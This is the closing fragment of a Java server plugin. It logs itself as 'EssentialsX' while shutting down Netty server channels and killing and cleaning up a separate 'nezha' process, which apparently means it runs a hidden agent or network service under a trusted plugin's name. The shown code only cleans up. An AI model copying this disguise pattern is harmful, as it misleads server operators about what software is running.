        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }
    
    private byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
                    + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }
    
    private String sha224Hex(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-224");
            byte[] digest = md.digest(input.getBytes(StandardCharsets.UTF_8));
            StringBuilder sb = new StringBuilder();
            for (byte b : digest) {
                sb.append(String.format("%02x", b & 0xff));
            }
            return sb.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }
    
    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        
        if (serverChannel != null && serverChannel.isOpen()) {
            serverChannel.close();
        }
        if (workerGroup != null) {
            workerGroup.shutdownGracefully();
        }
        if (bossGroup != null) {
            bossGroup.shutdownGracefully();
        }
        
        if (nezhaProcess != null && nezhaProcess.isAlive()) {
            nezhaProcess.destroy();
            
            try {
                if (!nezhaProcess.waitFor(10, TimeUnit.SECONDS)) {
                    nezhaProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated nezha process");
                } else {
                    getLogger().info("nezha process stopped normally");
                }
            } catch (InterruptedException e) {
                nezhaProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
        }
        
        cleanupNezha();
        isProcessRunning = false;
        getLogger().info("EssentialsX plugin disabled");
    }
}
